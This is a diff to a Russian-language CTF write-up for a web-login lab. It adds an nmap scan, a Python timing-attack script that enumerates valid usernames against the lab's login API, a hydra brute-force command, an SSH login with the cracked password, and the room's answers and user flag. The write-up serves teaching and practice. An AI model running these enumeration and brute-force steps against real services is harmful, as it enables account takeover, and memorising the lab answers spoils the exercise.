@@ -11,6 +11,9 @@
 ### Ответьте на вопросы ниже
 Какие порты открыты? (в порядке возрастания)
 ```commandline
+nmap -sSCV -p- <IP>
+```
+```commandline
 22,80,8080
 ```
 На каком языке программирования написан бэкэнд?
@@ -58,15 +61,22 @@ go
 
 В Python мы можем использовать этот код и библиотеку Requests для отправки этого запроса следующим образом:
 
-`creds = {"имя пользователя":имя пользователя,"пароль":"неверныйПароль!"}
-ответ = r.post(URL,json=creds)`
+```commandline
+creds = {"username":username,"password":"invalidPassword!"}
+response = r.post(URL,json=creds)
+```
 Следующий этап — это синхронизация. Используя стандартную библиотеку «time», мы можем вычислить разницу во времени 
 между отправкой запроса и получением ответа. Я переместил запрос на вход в его собственную функцию, называемую doLogin. 
 
-`startTime = время.время()
-doLogin(пользователь)
-endTime = время.время()`
-Следующий шаг — повторить это для всех имен пользователей в списке имен пользователей. Это можно сделать с помощью серии циклов for. Первый будет считывать имена пользователей из файла в список, а второй будет проверять каждое из этих имен пользователей и смотреть время, необходимое для ответа. Для моего эксплойта я решил, что времена в пределах 10% от самого большого времени, скорее всего, будут действительными именами пользователей.
+```commandline
+startTime = time.time()
+doLogin(user)
+endTime = time.time()
+```
+Следующий шаг — повторить это для всех имен пользователей в списке имен пользователей. Это можно сделать с помощью 
+серии циклов for. Первый будет считывать имена пользователей из файла в список, а второй будет проверять каждое из 
+этих имен пользователей и смотреть время, необходимое для ответа. Для моего эксплойта я решил, что времена в 
+пределах 10% от самого большого времени, скорее всего, будут действительными именами пользователей.
 
 
 Почему время меняется?
@@ -98,9 +108,40 @@ def login(username, password):
 ### Ответьте на вопросы ниже
 Попробуйте написать скрипт для проведения атаки по времени.
 ```commandline
+#!/usr/bin/env python3
+import sys
+import requests
+import time
+
+def main():
+    host = '10.10.156.130'
+
+    with open(sys.argv[1]) as f:
+        usernames = f.readlines()
+    usernames = [x.strip() for x in usernames] 
+
+    for username in usernames:
+        start = time.time()
+        creds = {"username":username,"password":"notimportant"}
+        r = requests.post("http://{}/api/user/login".format(host), data=creds)
+        done = time.time()
+        elapsed = done - start
+        if elapsed > 1:
+            print("[*] Valid user found: {}".format(username))
+
+if __name__ == '__main__':
+    if len(sys.argv) < 2:
+        print("Usage: {} /path/usernames/file.txt".format(sys.argv[0]))
+        sys.exit(1) 
+    main()
+```
+```commandline
 Ответ не нужен
 ```
 Сколько имен пользователей из списка действительны?
+```commandline
+./bruteforce-user.py /data/src/SecLists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt 
+```
 ```commandline
 1
 ```
@@ -145,13 +186,23 @@ hydra -l <имя пользователя> -P <список слов> 192.168.2.
 ### Ответьте на вопросы ниже
 Сформируйте команду hydra для атаки на маршрут API входа
 ```commandline
+hydra -l james -P wordlist.txt <IP> http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
+```
+```commandline
 Ответ не нужен
 ```
 Сколько паролей было в вашем списке слов?
 ```commandline
+./combinator.bin colors.txt numbers.txt > wordlist.txt
+wc -l wordlist.txt
+```
+```commandline
 180
 ```
 Какой пароль был у пользователя?
+```commandline
+hydra -l james -P wordlist.txt <IP> http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
+```
 ```commandline
 blue7
 ```
@@ -168,6 +219,12 @@ dak4ddb37b
 Ответ не нужен
 ```
 Что такое флаг пользователя?
+```commandline
+ssh james@<IP>
+james:dak4ddb37b
+ls -l
+cat user.txt
+```
 ```commandline
 thm{56911bd7ba1371a3221478aa5c094d68}
 ```
